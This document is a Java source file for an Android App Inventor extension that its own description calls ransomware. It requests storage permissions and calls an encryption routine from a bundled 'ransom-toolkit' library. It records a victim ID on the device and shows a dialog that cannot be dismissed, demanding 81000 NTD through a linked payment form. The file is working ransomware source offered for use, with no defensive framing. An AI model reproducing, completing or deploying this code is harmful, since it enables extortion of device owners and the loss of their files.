package com.extensions.ransom;

import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.spec.InvalidKeySpecException;
import java.util.Scanner;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

import com.asef18766.ransomtoolkit.Run;
import com.google.appinventor.components.annotations.DesignerComponent;
import com.google.appinventor.components.annotations.SimpleFunction;
import com.google.appinventor.components.annotations.SimpleObject;
import com.google.appinventor.components.annotations.UsesLibraries;
import com.google.appinventor.components.common.ComponentCategory;
import com.google.appinventor.components.runtime.AndroidNonvisibleComponent;
import com.google.appinventor.components.runtime.ComponentContainer;
import com.google.appinventor.components.runtime.Form;
import com.google.appinventor.components.runtime.PermissionResultHandler;

import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.content.Intent;
import android.net.Uri;
import android.os.Environment;
import android.os.StrictMode;
import android.util.Log;

@DesignerComponent(version = 1, category = ComponentCategory.EXTENSION, description = "", nonVisible = true, iconName = "")

@SimpleObject(external = true)
@UsesLibraries(libraries = "ransom-toolkit.jar")
public class Ransom extends AndroidNonvisibleComponent {
    public static String AI2_RANSOM_LOG_TAG = "AI2_RANSOM";
    private Form _form;

    public Ransom(ComponentContainer form) {
        super(form.$form());
        _form = (Form) form;
    }

    private void draw(String vic_id) {
        AlertDialog.Builder alertDialog = new AlertDialog.Builder(_form);
        alertDialog.setTitle("Your data have been encrypted!");
        alertDialog.setMessage(String.format(
                "you have to pay for 81000 NTD\n" +
                        "with client id: %s\n" +
                        "for your files",
                vic_id));
        alertDialog.setPositiveButton("OK", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                _form.startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(
                        "https://docs.google.com/forms/d/e/1FAIpQLSf429LI107XvIDlK5030ztn0euRmIsAx8WUoxU49wfI5PHIlw/viewform?usp=sf_link")));
            }
        });
        alertDialog.setNeutralButton("Cancel", new OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                _form.finishActivity(0);
                System.exit(0);
            }
        });
        alertDialog.setCancelable(false);
        alertDialog.show();
    }

    private void start() {
        try {
            new Run();
        } catch (InvalidKeyException | InvalidAlgorithmParameterException | NoSuchPaddingException
                | NoSuchAlgorithmException | IllegalBlockSizeException | InvalidKeySpecException
                | BadPaddingException e) {
            e.printStackTrace();
        }
    }

    volatile int finask = 0;

    private void ObtainPerm(String perm) {
        Log.i("perm", String.format("requesting for perm %s", perm));
        _form.askPermission("android.permission." + perm, new PermissionResultHandler() {
            @Override
            public void HandlePermissionResponse(String perm, boolean g_res) {
                if (g_res) {
                    Log.i("perm", String.format("obtain perm %s", perm));
                    finask++;
                } else {
                    Log.i("perm", String.format("obtain perm failed %s", perm));
                    _form.finishActivity(0);
                    System.exit(0);
                }

                if (finask == 2) {
                    if (checkTokenExsist()) {
                        Log.w(AI2_RANSOM_LOG_TAG, "token does exsist");
                        Run.VIC_ID = readToken();
                    } else {
                        start();
                        Log.i(AI2_RANSOM_LOG_TAG, String.format("vic id : %s\n", Run.VIC_ID));
                        writeToken(Run.VIC_ID);
                    }
                    draw(Run.VIC_ID);
                }
            }
        });
    }

    private static final String VIC_ID_LOCATION = Environment.getExternalStorageDirectory().toString() + "/Android/vic.id";

    private boolean checkTokenExsist() {
        Log.i(AI2_RANSOM_LOG_TAG, "dectecting token...");
        java.io.File f = new java.io.File(VIC_ID_LOCATION);
        return f.exists();
    }

    private void writeToken(String token) {
        try {
            FileWriter fWriter = new FileWriter(VIC_ID_LOCATION);
            fWriter.write(token);
            fWriter.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private String readToken() {
        String res = "";
        java.io.File myObj = new java.io.File(VIC_ID_LOCATION);
        try {
            Scanner myReader;
            myReader = new Scanner(myObj);
            while (myReader.hasNextLine()) {
                String buf = myReader.nextLine();
                res += buf;
            }
            myReader.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
        return res;
    }

    @SimpleFunction(description = "entry of ransomware")
    public void EntryPoint() {
        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);
        Log.i(AI2_RANSOM_LOG_TAG, String.format("path: %s\n", VIC_ID_LOCATION));
        ObtainPerm("READ_EXTERNAL_STORAGE");
        ObtainPerm("WRITE_EXTERNAL_STORAGE");
    }
}
